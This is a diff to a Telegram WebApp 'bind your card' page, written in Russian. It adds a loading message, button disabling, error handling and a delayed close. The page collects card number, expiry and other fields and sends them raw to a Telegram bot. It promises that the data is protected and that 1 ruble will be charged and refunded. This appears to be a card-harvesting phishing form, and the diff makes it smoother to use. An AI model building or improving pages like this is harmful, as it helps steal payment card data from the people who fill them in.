@@ -114,6 +114,13 @@
             font-size: 12px;
             color: #8e8e93;
         }
+
+        .loading {
+            text-align: center;
+            margin-top: 20px;
+            color: #007aff;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -145,6 +152,7 @@
                 </div>
 
                 <div class="error" id="errorMessage">Пожалуйста, заполните все поля корректно</div>
+                <div class="loading" id="loading">Обработка...</div>
                 <button type="submit">✅ Привязать карту</button>
             </form>
             <div class="secure">🔒 Данные защищены. Будет списано и возвращено 1₽</div>
@@ -157,9 +165,14 @@
         tg.expand();
         tg.MainButton.hide();
         tg.BackButton.hide();
+        
+        // Показываем, что WebApp готов
+        tg.ready();
 
         const form = document.getElementById('cardForm');
         const errorDiv = document.getElementById('errorMessage');
+        const loadingDiv = document.getElementById('loading');
+        const submitBtn = document.querySelector('button');
 
         // Форматирование номера карты
         const cardInput = document.getElementById('cardNumber');
@@ -210,6 +223,10 @@
                 return;
             }
 
+            // Показываем загрузку
+            loadingDiv.style.display = 'block';
+            submitBtn.disabled = true;
+
             const cardData = {
                 card_number: cardNumber,
                 expiry: expiry,
@@ -218,9 +235,19 @@
                 timestamp: new Date().toISOString()
             };
 
-            // Отправляем данные обратно в бота
-            tg.sendData(JSON.stringify(cardData));
-            tg.close();
+            try {
+                // Отправляем данные обратно в бота
+                tg.sendData(JSON.stringify(cardData));
+                // Закрываем WebApp после отправки
+                setTimeout(() => {
+                    tg.close();
+                }, 500);
+            } catch (error) {
+                console.error('Error sending data:', error);
+                showError('Ошибка отправки данных');
+                loadingDiv.style.display = 'none';
+                submitBtn.disabled = false;
+            }
         });
 
         function showError(msg) {
@@ -230,6 +257,11 @@
                 errorDiv.style.display = 'none';
             }, 3000);
         }
+        
+        // Обработка закрытия WebApp
+        tg.onEvent('viewportChanged', function() {
+            console.log('Viewport changed');
+        });
     </script>
 </body>
-</html>
+    </html>
